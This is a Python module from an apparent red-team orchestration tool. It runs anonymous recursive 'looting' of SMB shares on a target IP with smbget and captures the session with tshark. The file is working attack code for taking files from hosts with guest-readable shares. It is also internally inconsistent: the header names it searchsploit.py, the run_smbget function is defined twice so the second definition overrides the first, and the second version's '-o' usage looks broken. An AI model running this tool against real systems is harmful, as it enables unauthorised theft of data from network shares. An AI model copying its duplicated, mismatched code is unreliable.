#!/usr/bin/env python3
"""
Project: ScAnRoIdS Red Team Orchestrator
Module:  modules/searchsploit.py
Purpose: Interactive SMB Looting module. 
         Allows operator to target specific shares for recursive downloads.
"""

import time
import subprocess
from core.ui import (
    log_task, log_success, log_error, log_note,
    YELLOW, BLUE, RED, CYAN, BOLD, RESET, BULLET
    )
from core.system import INTERFACE


def run_smbget(ctx, ip, share_name="IPC$"):
    # 1. Setup Naming and Paths
    # Clean up share name for file system compatibility
    clean_share = share_name.replace('$', '').replace('/', '_').replace('\\', '_')
    file_base = f"smbget_loot_{ctx.customer}_{ip.replace('.','-')}_{clean_share}_{ctx.date_str}_{ctx.time_str}"
    pcap_path = ctx.dirs['pcap'] / f"{file_base}.pcapng"

    # Create a specific sub-directory for this host's loot
    loot_dir = ctx.dirs['artifacts'] / f"loot_{ip.replace('.','-')}_{clean_share}"
    loot_dir.mkdir(exist_ok=True)

    # 2. Start Tshark (Targeted Filter)
    cap_filter = f"host {ip}"
    t_cmd = ["tshark", "-i", INTERFACE, "-w", str(pcap_path), "-f", cap_filter, "-q"]

    print(f"\n{YELLOW}--- [ SMB LOOT CAPTURE ] ---{RESET}")
    log_task(f"Capture Start: {pcap_path.name}")
    log_note(f"Wireshark filter: {RESET}'smb || ntlmssp'")
    t_proc = subprocess.Popen(t_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2) # Warmup

    # 3. Construct smbget Command
    # -R: Recursive, -n: Anonymous/Guest
    # We target the root of the provided share
    cmd = ["smbget", "-R", "-n", f"smb://{ip}/{share_name}"]

    # Note: smbget downloads to the current working directory.
    # We will use 'cwd' in subprocess to force it into our loot folder.
    print(f"\n{YELLOW}--- [ SMB RECURSIVE LOOTING ] ---{RESET}")
    log_task(f"Executing: {' '.join(cmd)}")
    log_note(f"Targeting: smb://{ip}/{share_name} -> {loot_dir}")

    try:
        # We use subprocess.run for smbget as it handles the transfer more atomically
        # We set 'cwd' to our specific loot directory
        result = subprocess.run(cmd, capture_output=True, text=True, cwd=str(loot_dir), timeout=300)

        if result.returncode == 0:
            log_success(f"Looting successful. Files stored in: {loot_dir}")
            log_success(f"PCAP Generated: {pcap_path.name}")
        else:
            log_error(f"Looting failed for {share_name}. (Check if share is actually readable)")
            if result.stderr:
                log_note(f"Error Details: {result.stderr.strip()}")

    except Exception as e:
        log_error(f"smbget execution error: {e}")
    finally:
        if 't_proc' in locals():
            t_proc.terminate()
            log_note(f"Capture Closed for {ip}")
        print(f"{YELLOW}------------------------------{RESET}\n")


def run_smbget(ctx, ip, share="IPC$"):
    """Attempts recursive loot gathering from identified shares."""
    loot_dir = ctx.dirs['artifacts'] / f"loot_smb_{ip}_{share.replace('$', '')}"
    loot_dir.mkdir(exist_ok=True)

    # Flags: -R (Recursive), -n (Guest/Anonymous)
    cmd = ["smbget", "-R", "-n", f"smb://{ip}/{share}", "-o", str(loot_dir)]

    print(f"\n{YELLOW}--- [ SMB LOOT GATHERING PHASE ] ---{RESET}")
    log_task(f"Attempting Recursive Download: {' '.join(cmd)}")

    try:
        # We don't stream smbget to terminal as it can be messy with file lists
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            log_success(f"Loot successfully pulled from {ip}/{share} to {loot_dir}")
            print(f"{YELLOW}---------------------------------{RESET}\n")

        else:
            log_error(f"smbget failed (Likely Access Denied or No Files).")
            print(f"{YELLOW}---------------------------------{RESET}\n")
    except Exception as e:
        log_error(f"smbget execution error: {e}")
        print(f"{YELLOW}---------------------------------{RESET}\n")
